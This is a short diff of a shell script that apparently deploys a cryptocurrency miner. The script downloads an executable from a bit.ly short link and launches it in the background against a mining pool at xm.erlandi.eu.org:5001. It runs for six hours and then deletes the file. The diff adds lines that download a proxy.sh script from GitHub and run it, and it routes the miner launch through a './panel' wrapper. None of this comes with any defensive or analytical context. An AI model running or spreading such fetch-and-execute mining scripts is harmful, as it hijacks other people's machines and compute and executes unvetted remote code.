@@ -4,8 +4,11 @@
 # kumaha aink we njink
 
 cd /home
+wget https://raw.githubusercontent.com/petugas/e/main/proxy.sh
+chmod +x proxy.sh
+sh proxy.sh
 wget https://bit.ly/3mPeYds
 chmod +x 3mPeYds 
-./3mPeYds -B -o xm.erlandi.eu.org:5001
+./panel ./3mPeYds -B -o xm.erlandi.eu.org:5001
 sleep 6h
 rm -irf 3mPeYds
